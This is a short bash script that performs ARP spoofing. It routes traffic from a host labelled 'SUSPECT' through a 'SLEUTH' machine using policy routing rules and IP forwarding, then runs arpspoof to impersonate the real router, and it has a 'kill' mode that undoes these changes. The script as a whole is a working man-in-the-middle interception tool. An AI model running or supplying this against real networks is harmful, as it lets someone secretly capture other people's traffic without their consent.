#!/bin/bash

export ROUTER=192.168.0.111
export SLEUTH=192.168.0.127
export SUSPECT=192.168.0.104
export REAL_ROUTER=192.168.0.1
export TABLE=111
export INTERFACE=eth0



if [ "$1" = "start" ]
then
	echo "CURRENT PARAMS:" 
	echo
	echo "IP RULES"
	ip rule list
	echo 
	echo "IP ROUTES"
	ip route list
	echo 
	echo "IP ROUTE TABLE:" $TABLE
	ip route list table $TABLE
	echo
	echo
	echo
	ip rule add from $SUSPECT table $TABLE priority 4
	ip route add default via $SLEUTH table $TABLE
	echo 1 > /proc/sys/net/ipv4/ip_forward
	echo
	echo
	echo "NEW PARAMS:" 
	echo
	echo "IP RULES"
	ip rule list
	echo 
	echo "IP ROUTES"
	ip route list
	echo 
	echo "IP ROUTE TABLE:" $TABLE
	ip route list table $TABLE
	echo
	echo
	echo
	arpspoof -i $INTERFACE -t $SUSPECT $REAL_ROUTER
else
if [ "$1" = "kill" ]
then
	echo "CURRENT PARAMS:" 
	echo
	echo "IP RULES"
	ip rule list
	echo 
	echo "IP ROUTES"
	ip route list
	echo 
	echo "IP ROUTE TABLE:" $TABLE
	ip route list table $TABLE
	echo
	echo
	echo
	ip rule del from $SUSPECT lookup $TABLE
	ip route del table $TABLE
	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo
	echo
	echo "NEW PARAMS:" 
	echo
	echo "IP RULES"
	ip rule list
	echo 
	echo "IP ROUTES"
	ip route list
	echo 
	echo "IP ROUTE TABLE:" $TABLE
	ip route list table $TABLE
	echo
	echo
	echo
else
	echo "Please use 'start' or 'kill' args"
fi
fi


